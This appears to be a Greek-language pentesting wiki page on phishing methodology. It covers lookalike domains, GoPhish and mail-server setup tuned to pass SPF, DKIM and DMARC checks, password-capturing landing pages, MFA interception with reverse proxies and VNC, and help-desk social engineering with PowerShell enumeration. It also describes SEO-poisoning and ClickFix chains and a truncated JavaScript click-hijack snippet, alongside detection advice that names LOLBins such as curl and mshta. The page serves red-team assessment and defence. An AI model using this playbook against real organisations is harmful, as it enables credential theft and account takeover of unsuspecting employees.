# Μεθοδολογία Phishing

## Μεθοδολογία

1. Κάντε Recon στο θύμα
1. Επιλέξτε το **victim domain**.
2. Εκτελέστε βασικό web enumeration **αναζητώντας login portals** που χρησιμοποιεί το θύμα και **αποφασίστε** ποιο θα **impersonate**.
3. Χρησιμοποιήστε **OSINT** για να **βρείτε emails**.
2. Προετοιμάστε το περιβάλλον
1. **Αγοράστε το domain** που πρόκειται να χρησιμοποιήσετε για το phishing assessment
2. **Διαμορφώστε τις σχετικές εγγραφές του email service** (SPF, DMARC, DKIM, rDNS)
3. Διαμορφώστε το VPS με **gophish**
3. Προετοιμάστε την campaign
1. Προετοιμάστε το **email template**
2. Προετοιμάστε τη **web page** για την κλοπή των credentials
4. Εκκινήστε την campaign!

## Δημιουργία παρόμοιων domain names ή αγορά trusted domain

### Τεχνικές παραλλαγής Domain Name

- **Keyword**: Το domain name **περιέχει** ένα σημαντικό **keyword** του αρχικού domain (π.χ., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Αλλάξτε την **τελεία σε παύλα** ενός subdomain (π.χ., www-zelster.com).
- **New TLD**: Το ίδιο domain με χρήση ενός **νέου TLD** (π.χ., zelster.org)
- **Homoglyph**: **Αντικαθιστά** ένα γράμμα στο domain name με **γράμματα που μοιάζουν** (π.χ., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Αντιστρέφει** δύο γράμματα μέσα στο domain name (π.χ., zelsetr.com).
- **Singularization/Pluralization**: Προσθέτει ή αφαιρεί το “s” στο τέλος του domain name (π.χ., zeltsers.com).
- **Omission**: **Αφαιρεί ένα** από τα γράμματα του domain name (π.χ., zelser.com).
- **Repetition:** **Επαναλαμβάνει ένα** από τα γράμματα του domain name (π.χ., zeltsser.com).
- **Replacement**: Όπως το homoglyph, αλλά λιγότερο stealthy. Αντικαθιστά ένα από τα γράμματα του domain name, πιθανώς με ένα γράμμα που βρίσκεται κοντά στο αρχικό γράμμα στο πληκτρολόγιο (π.χ., zektser.com).
- **Subdomained**: Εισάγει μια **τελεία** μέσα στο domain name (π.χ., ze.lster.com).
- **Insertion**: **Εισάγει ένα γράμμα** στο domain name (π.χ., zerltser.com).
- **Missing dot**: Προσθέτει το TLD στο domain name. (π.χ., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Υπάρχει **πιθανότητα ορισμένα από τα bits που είναι αποθηκευμένα ή βρίσκονται σε επικοινωνία να αναστραφούν αυτόματα** λόγω διάφορων παραγόντων, όπως ηλιακές εκλάμψεις, κοσμικές ακτίνες ή σφάλματα υλικού.

Όταν αυτή η έννοια **εφαρμόζεται σε DNS requests**, είναι πιθανό το **domain που λαμβάνει ο DNS server** να μην είναι το ίδιο με το domain που ζητήθηκε αρχικά.

Για παράδειγμα, μια τροποποίηση ενός bit στο domain "windows.com" μπορεί να το αλλάξει σε "windnws.com."

Οι επιτιθέμενοι μπορεί να **εκμεταλλευτούν αυτό καταχωρίζοντας πολλαπλά bit-flipping domains** που μοιάζουν με το domain του θύματος. Σκοπός τους είναι να ανακατευθύνουν νόμιμους χρήστες στη δική τους υποδομή.

Για περισσότερες πληροφορίες, διαβάστε το [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Αγορά trusted domain

Μπορείτε να αναζητήσετε στο [https://www.expireddomains.net/](https://www.expireddomains.net) ένα expired domain που θα μπορούσατε να χρησιμοποιήσετε.\
Για να βεβαιωθείτε ότι το expired domain που πρόκειται να αγοράσετε **έχει ήδη καλό SEO**, μπορείτε να αναζητήσετε πώς κατηγοριοποιείται στα:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Ανακάλυψη Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% δωρεάν)
- [https://phonebook.cz/](https://phonebook.cz) (100% δωρεάν)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Για να **ανακαλύψετε περισσότερες** έγκυρες διευθύνσεις email ή να **επαληθεύσετε όσες** έχετε ήδη ανακαλύψει, μπορείτε να ελέγξετε αν μπορείτε να κάνετε brute-force στους smtp servers του θύματος. [Μάθετε εδώ πώς να επαληθεύετε/ανακαλύπτετε διευθύνσεις email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Επιπλέον, μην ξεχνάτε ότι αν οι χρήστες χρησιμοποιούν **οποιοδήποτε web portal για να έχουν πρόσβαση στα emails τους**, μπορείτε να ελέγξετε αν είναι ευάλωτο σε **username brute force** και να εκμεταλλευτείτε την ευπάθεια, αν είναι δυνατό.

## Διαμόρφωση του GoPhish

### Εγκατάσταση

Μπορείτε να το κατεβάσετε από το [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Κατεβάστε το και αποσυμπιέστε το μέσα στο `/opt/gophish` και εκτελέστε το `/opt/gophish/gophish`\
Θα σας δοθεί ένας κωδικός πρόσβασης για τον admin user στη θύρα 3333 στην έξοδο. Επομένως, αποκτήστε πρόσβαση σε αυτήν τη θύρα και χρησιμοποιήστε αυτά τα credentials για να αλλάξετε τον κωδικό πρόσβασης του admin. Ίσως χρειαστεί να κάνετε tunnel αυτήν τη θύρα προς το local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Διαμόρφωση

**Διαμόρφωση πιστοποιητικού TLS**

Πριν από αυτό το βήμα, θα πρέπει να έχετε **ήδη αγοράσει το domain** που πρόκειται να χρησιμοποιήσετε και αυτό να **δείχνει** στη **διεύθυνση IP του VPS** όπου διαμορφώνετε το **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Ρύθμιση mail**

Ξεκινήστε την εγκατάσταση: `apt-get install postfix`

Στη συνέχεια προσθέστε το domain στα ακόλουθα αρχεία:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Αλλάξτε επίσης τις τιμές των ακόλουθων μεταβλητών μέσα στο /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Τέλος, τροποποιήστε τα αρχεία **`/etc/hostname`** και **`/etc/mailname`** ώστε να περιέχουν το domain name σας και **κάντε restart στο VPS.**

Τώρα, δημιουργήστε ένα **DNS A record** για το `mail.<domain>` που να δείχνει στη **διεύθυνση IP** του VPS και ένα **DNS MX** record που να δείχνει στο `mail.<domain>`

Τώρα ας δοκιμάσουμε να στείλουμε ένα email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Διαμόρφωση Gophish**

Σταματήστε την εκτέλεση του gophish και ας το διαμορφώσουμε.\
Τροποποιήστε το `/opt/gophish/config.json` ως εξής (σημειώστε τη χρήση του https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Διαμόρφωση του gophish service**

Για να δημιουργήσετε το gophish service, ώστε να μπορεί να ξεκινά αυτόματα και να γίνεται managed ως service, μπορείτε να δημιουργήσετε το αρχείο `/etc/init.d/gophish` με το ακόλουθο περιεχόμενο:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Ολοκληρώστε τη ρύθμιση της υπηρεσίας και ελέγξτε την κάνοντας:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Διαμόρφωση mail server και domain

### Περιμένετε και δείξτε νομιμότητα

Όσο παλαιότερο είναι ένα domain, τόσο λιγότερο πιθανό είναι να καταχωριστεί ως spam. Επομένως, πρέπει να περιμένετε όσο το δυνατόν περισσότερο (τουλάχιστον 1 εβδομάδα) πριν από το phishing assessment. Επιπλέον, αν τοποθετήσετε μια σελίδα σχετικά με έναν τομέα με καλή reputation, η reputation που θα αποκτήσετε θα είναι καλύτερη.

Σημειώστε ότι, ακόμη και αν πρέπει να περιμένετε μία εβδομάδα, μπορείτε να ολοκληρώσετε τώρα τη διαμόρφωση όλων των στοιχείων.

### Διαμόρφωση εγγραφής Reverse DNS (rDNS)

Ορίστε μια εγγραφή rDNS (PTR), η οποία επιλύει τη διεύθυνση IP του VPS στο domain name.

### Εγγραφή Sender Policy Framework (SPF)

Πρέπει να **διαμορφώσετε μια εγγραφή SPF για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή SPF, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Μπορείτε να χρησιμοποιήσετε το [https://www.spfwizard.net/](https://www.spfwizard.net) για να δημιουργήσετε την SPF policy σας (χρησιμοποιήστε την IP του VPS machine)

![Φόρμα SPF Wizard για τη δημιουργία μιας εγγραφής SPF για ένα phishing domain](<../../images/image (1037).png>)

Αυτό είναι το περιεχόμενο που πρέπει να οριστεί μέσα σε μια εγγραφή TXT στο domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Πρέπει να **διαμορφώσετε ένα DMARC record για το νέο domain**. Αν δεν γνωρίζετε τι είναι ένα DMARC record, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Πρέπει να δημιουργήσετε ένα νέο DNS TXT record που να δείχνει στο hostname `_dmarc.<domain>` με το ακόλουθο περιεχόμενο:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Πρέπει να **διαμορφώσετε ένα DKIM για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή DMARC, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Αυτό το tutorial βασίζεται στο: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Χρειάζεται να ενώσετε και τις δύο τιμές B64 που δημιουργεί το κλειδί DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Ελέγξτε τη βαθμολογία της διαμόρφωσης του email σας

Μπορείτε να το κάνετε χρησιμοποιώντας το [https://www.mail-tester.com/](https://www.mail-tester.com)\
Απλώς ανοίξτε τη σελίδα και στείλτε ένα email στη διεύθυνση που σας παρέχουν:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Μπορείτε επίσης να **ελέγξετε τη ρύθμιση του email σας** στέλνοντας ένα email στη διεύθυνση `check-auth@verifier.port25.com` και **διαβάζοντας την απάντηση** (για αυτό θα χρειαστεί να **ανοίξετε** τη θύρα **25** και να δείτε την απάντηση στο αρχείο _/var/mail/root_ αν στείλετε το email ως root).\
Ελέγξτε ότι περνάτε όλες τις δοκιμές:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Θα μπορούσατε επίσης να στείλετε **μήνυμα σε ένα Gmail που ελέγχετε** και να ελέγξετε τις **κεφαλίδες του email** στα εισερχόμενα του Gmail σας· το `dkim=pass` θα πρέπει να υπάρχει στο πεδίο κεφαλίδας `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Αφαίρεση από τη μαύρη λίστα της Spamhouse

Η σελίδα [www.mail-tester.com](https://www.mail-tester.com) μπορεί να σας ενημερώσει αν το domain σας έχει αποκλειστεί από τη Spamhouse. Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Αφαίρεση από τη μαύρη λίστα της Microsoft

​​Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση [https://sender.office.com/](https://sender.office.com).

## Δημιουργία & εκκίνηση καμπάνιας GoPhish

### Προφίλ αποστολής

- Ορίστε κάποιο **όνομα για την αναγνώριση** του προφίλ αποστολέα
- Αποφασίστε από ποιον λογαριασμό θα στείλετε τα phishing emails. Προτάσεις: _noreply, support, servicedesk, salesforce..._
- Μπορείτε να αφήσετε κενά το username και το password, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors

![Δημιουργία & εκκίνηση καμπάνιας GoPhish - Προφίλ αποστολής: Μπορείτε να αφήσετε κενά το username και το password, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Συνιστάται να χρησιμοποιήσετε τη λειτουργία "**Send Test Email**" για να ελέγξετε ότι όλα λειτουργούν σωστά.\
> Θα συνιστούσα να **στέλνετε τα δοκιμαστικά emails σε διευθύνσεις 10min mail**, ώστε να αποφύγετε την καταχώρισή σας σε blacklist κατά τη διάρκεια των δοκιμών.

### Πρότυπο email

- Ορίστε κάποιο **όνομα για την αναγνώριση** του template
- Στη συνέχεια γράψτε ένα **subject** (τίποτα παράξενο, απλώς κάτι που θα περιμένατε να διαβάσετε σε ένα συνηθισμένο email)
- Βεβαιωθείτε ότι έχετε επιλέξει το "**Add Tracking Image**"
- Γράψτε το **template του email** (μπορείτε να χρησιμοποιήσετε μεταβλητές όπως στο ακόλουθο παράδειγμα):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Σημειώστε ότι **για να αυξηθεί η αξιοπιστία του email**, συνιστάται να χρησιμοποιήσετε κάποια υπογραφή από ένα email του πελάτη. Προτάσεις:

- Στείλτε ένα email σε μια **ανύπαρκτη διεύθυνση** και ελέγξτε αν η απάντηση περιέχει κάποια υπογραφή.
- Αναζητήστε **δημόσια emails** όπως info@ex.com ή press@ex.com ή public@ex.com, στείλτε τους ένα email και περιμένετε την απάντηση.
- Προσπαθήστε να επικοινωνήσετε με κάποιο **έγκυρο email που ανακαλύφθηκε** και περιμένετε την απάντηση

![Sending Profile - Πρότυπο email: Προσπαθήστε να επικοινωνήσετε με κάποιο έγκυρο email που ανακαλύφθηκε και περιμένετε την απάντηση](<../../images/image (80).png>)

> [!TIP]
> Το Πρότυπο email επιτρέπει επίσης την **επισύναψη αρχείων για αποστολή**. Αν θέλετε επίσης να κλέψετε NTLM challenges χρησιμοποιώντας ειδικά διαμορφωμένα αρχεία/έγγραφα [διαβάστε αυτή τη σελίδα](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Γράψτε ένα **όνομα**
- **Γράψτε τον HTML κώδικα** της ιστοσελίδας. Σημειώστε ότι μπορείτε να **εισαγάγετε** ιστοσελίδες.
- Επιλέξτε **Capture Submitted Data** και **Capture Passwords**
- Ορίστε μια **ανακατεύθυνση**

![Email Template - Landing Page: Επιλέξτε Capture Submitted Data και Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Συνήθως θα χρειαστεί να τροποποιήσετε τον HTML κώδικα της σελίδας και να κάνετε ορισμένες δοκιμές τοπικά (ίσως χρησιμοποιώντας κάποιον Apache server) **μέχρι να μείνετε ικανοποιημένοι με τα αποτελέσματα.** Στη συνέχεια, γράψτε αυτόν τον HTML κώδικα στο πλαίσιο.\
> Σημειώστε ότι αν χρειάζεται να **χρησιμοποιήσετε κάποια στατικά resources** για το HTML (ίσως κάποιες σελίδες CSS και JS), μπορείτε να τα αποθηκεύσετε στο _**/opt/gophish/static/endpoint**_ και στη συνέχεια να αποκτήσετε πρόσβαση σε αυτά από το _**/static/\<filename>**_

> [!TIP]
> Για την ανακατεύθυνση, θα μπορούσατε να **ανακατευθύνετε τους χρήστες στην κύρια legit ιστοσελίδα** του θύματος ή να τους ανακατευθύνετε, για παράδειγμα, στο _/static/migration.html_, να προσθέσετε κάποιο **spinning wheel (**[**https://loading.io/**](https://loading.io)**) για 5 δευτερόλεπτα και στη συνέχεια να υποδεικνύετε ότι η διαδικασία ολοκληρώθηκε με επιτυχία**.

### Users & Groups

- Ορίστε ένα όνομα
- **Εισαγάγετε τα δεδομένα** (σημειώστε ότι για να χρησιμοποιήσετε το template του παραδείγματος χρειάζεστε το firstname, το last name και τη διεύθυνση email κάθε χρήστη)

![Landing Page - Users & Groups: Εισαγάγετε τα δεδομένα (σημειώστε ότι για να χρησιμοποιήσετε το template του παραδείγματος χρειάζεστε το firstname, το last name και τη διεύθυνση email κάθε χρήστη)](<../../images/image (163).png>)

### Campaign

Τέλος, δημιουργήστε ένα campaign επιλέγοντας ένα όνομα, το email template, τη landing page, το URL, το sending profile και το group. Σημειώστε ότι το URL θα είναι ο σύνδεσμος που θα σταλεί στα θύματα

Σημειώστε ότι το **Sending Profile επιτρέπει την αποστολή ενός δοκιμαστικού email για να δείτε πώς θα εμφανίζεται το τελικό phishing email**:

![Users & Groups - Campaign: Σημειώστε ότι το Sending Profile επιτρέπει την αποστολή ενός δοκιμαστικού email για να δείτε πώς θα εμφανίζεται το τελικό phishing email](<../../images/image (192).png>)

Μόλις όλα είναι έτοιμα, απλώς εκκινήστε το campaign!

## Cloning ιστοσελίδας

Αν για οποιονδήποτε λόγο θέλετε να κάνετε clone την ιστοσελίδα, δείτε την ακόλουθη σελίδα:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Σε ορισμένα phishing assessments (κυρίως για Red Teams) θα θέλετε επίσης να **στείλετε αρχεία που περιέχουν κάποιο είδος backdoor** (ίσως ένα C2 ή απλώς κάτι που θα ενεργοποιήσει μια authentication).\
Δείτε την ακόλουθη σελίδα για ορισμένα παραδείγματα:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Μέσω Proxy MitM

Η προηγούμενη επίθεση είναι αρκετά έξυπνη, καθώς προσποιείστε ότι είστε μια πραγματική ιστοσελίδα και συλλέγετε τις πληροφορίες που εισάγει ο χρήστης. Δυστυχώς, αν ο χρήστης δεν εισήγαγε τον σωστό κωδικό πρόσβασης ή αν η εφαρμογή που προσποιηθήκατε ότι είστε έχει ρυθμιστεί με 2FA, **αυτές οι πληροφορίες δεν θα σας επιτρέψουν να impersonate τον εξαπατημένο χρήστη**.

Σε αυτό το σημείο είναι χρήσιμα εργαλεία όπως τα [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) και [**muraena**](https://github.com/muraenateam/muraena). Αυτό το εργαλείο θα σας επιτρέψει να δημιουργήσετε μια επίθεση τύπου MitM. Βασικά, η επίθεση λειτουργεί με τον ακόλουθο τρόπο:

1. **Impersonate τη φόρμα login** της πραγματικής ιστοσελίδας.
2. Ο χρήστης **στέλνει** τα **credentials** του στη fake σελίδα σας και το εργαλείο τα στέλνει στην πραγματική ιστοσελίδα, **ελέγχοντας αν τα credentials λειτουργούν**.
3. Αν ο λογαριασμός έχει ρυθμιστεί με **2FA**, η σελίδα MitM θα το ζητήσει και μόλις ο **χρήστης το εισαγάγει**, το εργαλείο θα το στείλει στην πραγματική ιστοσελίδα.
4. Μόλις ο χρήστης authenticated, εσείς (ως attacker) θα έχετε **captured τα credentials, το 2FA, το cookie και κάθε πληροφορία** από κάθε αλληλεπίδραση που πραγματοποιήθηκε όσο το εργαλείο εκτελούσε MitM.

### Μέσω VNC

Τι θα γινόταν αν, αντί να **στείλετε το θύμα σε μια κακόβουλη σελίδα** με την ίδια εμφάνιση με την αρχική, το στέλνατε σε μια **VNC session με browser συνδεδεμένο στην πραγματική ιστοσελίδα**; Θα μπορείτε να δείτε τι κάνει, να κλέψετε τον κωδικό πρόσβασης, το MFA που χρησιμοποιήθηκε, τα cookies...\
Μπορείτε να το κάνετε αυτό με το [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Εντοπισμός του εντοπισμού

Προφανώς, ένας από τους καλύτερους τρόπους να μάθετε αν σας έχουν εντοπίσει είναι να **αναζητήσετε το domain σας σε blacklists**. Αν εμφανίζεται καταχωρισμένο, με κάποιον τρόπο το domain σας εντοπίστηκε ως ύποπτο.\
Ένας εύκολος τρόπος για να ελέγξετε αν το domain σας εμφανίζεται σε κάποια blacklist είναι να χρησιμοποιήσετε το [https://malwareworld.com/](https://malwareworld.com)

Ωστόσο, υπάρχουν και άλλοι τρόποι για να μάθετε αν το θύμα **αναζητά ενεργά ύποπτη phishing δραστηριότητα στο διαδίκτυο**, όπως εξηγείται στο:


{{#ref}}
detecting-phising.md
{{#endref}}

Μπορείτε να **αγοράσετε ένα domain με πολύ παρόμοιο όνομα** με το domain του θύματος **και/ή να δημιουργήσετε ένα certificate** για ένα **subdomain** ενός domain που ελέγχετε, **περιέχοντας** το **keyword** του domain του θύματος. Αν το **θύμα** πραγματοποιήσει οποιαδήποτε **DNS ή HTTP αλληλεπίδραση** με αυτά, θα γνωρίζετε ότι **αναζητά ενεργά** ύποπτα domains και θα πρέπει να είστε πολύ stealth.<sup>[[2]](#references)</sup>

### Αξιολόγηση του phishing

Χρησιμοποιήστε το [**Phishious** ](https://github.com/Rices/Phishious)για να αξιολογήσετε αν το email σας θα καταλήξει στον φάκελο spam ή αν θα αποκλειστεί ή θα είναι επιτυχές.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Τα σύγχρονα intrusion sets παρακάμπτουν όλο και περισσότερο τα email lures και **στοχεύουν απευθείας τη ροή εργασίας του service-desk / identity-recovery** για να παρακάμψουν το MFA. Η επίθεση είναι πλήρως "living-off-the-land": μόλις ο operator αποκτήσει έγκυρα credentials, μετακινείται χρησιμοποιώντας ενσωματωμένα admin εργαλεία – δεν απαιτείται malware.<sup>[[6]](#references)</sup>

### Ροή επίθεσης
1. Recon του θύματος
* Συλλογή προσωπικών και εταιρικών στοιχείων από το LinkedIn, data breaches, δημόσια GitHub κ.λπ.
* Εντοπισμός identities υψηλής αξίας (στελέχη, IT, οικονομικό τμήμα) και καταγραφή της **ακριβούς διαδικασίας του help-desk** για password / MFA reset.
2. Social engineering σε πραγματικό χρόνο
* Τηλεφωνήστε, χρησιμοποιήστε Teams ή συνομιλία με το help-desk υποδυόμενοι τον στόχο (συχνά με **spoofed caller-ID** ή **cloned voice**).
* Παρέχετε τα PII που συλλέχθηκαν προηγουμένως για να περάσετε την επαλήθευση βάσει γνώσεων.
* Πείστε τον agent να **κάνει reset το MFA secret** ή να πραγματοποιήσει **SIM-swap** σε καταχωρισμένο αριθμό κινητού.
3. Άμεσες ενέργειες μετά την πρόσβαση (≤60 min σε πραγματικές περιπτώσεις)
* Δημιουργήστε foothold μέσω οποιουδήποτε web SSO portal.
* Κάντε enumerate το AD / AzureAD με built-ins (χωρίς να αποθέσετε binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Πραγματοποιήστε lateral movement με **WMI**, **PsExec** ή νόμιμους **RMM** agents που είναι ήδη whitelisted στο περιβάλλον.

### Εντοπισμός & Mitigation
* Αντιμετωπίστε το identity recovery του help-desk ως **privileged operation** – απαιτήστε step-up auth και έγκριση manager.
* Αναπτύξτε κανόνες **Identity Threat Detection & Response (ITDR)** / **UEBA** που δημιουργούν alert για:
* Αλλαγή μεθόδου MFA + authentication από νέα συσκευή / γεωγραφική τοποθεσία.
* Άμεση ανύψωση δικαιωμάτων του ίδιου principal (user-→-admin).
* Καταγράψτε τις κλήσεις στο help-desk και επιβάλετε **call-back σε ήδη καταχωρισμένο αριθμό** πριν από οποιοδήποτε reset.
* Υλοποιήστε **Just-In-Time (JIT) / Privileged Access**, ώστε οι λογαριασμοί που μόλις έκαναν reset να μην κληρονομούν αυτόματα tokens υψηλών δικαιωμάτων.

---

## Εξαπάτηση σε κλίμακα – SEO Poisoning & “ClickFix” Campaigns
Τα commodity crews αντισταθμίζουν το κόστος των high-touch operations με μαζικές επιθέσεις που μετατρέπουν τις **μηχανές αναζήτησης και τα ad networks σε κανάλι παράδοσης**.<sup>[[6]](#references)</sup>

1. Το **SEO poisoning / malvertising** προωθεί ένα fake αποτέλεσμα, όπως το `chromium-update[.]site`, στην κορυφή των search ads.
2. Το θύμα κατεβάζει έναν μικρό **first-stage loader** (συχνά JS/HTA/ISO). Παραδείγματα που παρατηρήθηκαν από την Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Ο loader κάνει exfiltrate τα browser cookies + credential DBs και στη συνέχεια κατεβάζει έναν **silent loader**, ο οποίος αποφασίζει – *σε πραγματικό χρόνο* – αν θα αναπτύξει:
* RAT (π.χ. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Συμβουλές Hardening
* Αποκλείστε domains που καταχωρίστηκαν πρόσφατα και επιβάλετε **Advanced DNS / URL Filtering** και στα *search ads* και στα email.
* Περιορίστε την εγκατάσταση software σε signed MSI / Store packages και αποκλείστε την εκτέλεση `HTA`, `ISO`, `VBS` μέσω policy.
* Παρακολουθήστε child processes browsers που ανοίγουν installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Αναζητήστε LOLBins που συχνά καταχρώνται οι first-stage loaders (π.χ. `regsvr32`, `curl`, `mshta`).

### Υφαρπαγή click στο download button με TDS handoff
Ορισμένα fake software portals διατηρούν το ορατό download `href` να δείχνει στο **πραγματικό GitHub/release URL**, αλλά υφαρπάζουν την **πρώτη** αλληλεπίδραση του χρήστη στη JavaScript και στέλνουν αντ' αυτού το θύμα σε μια αλυσίδα **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
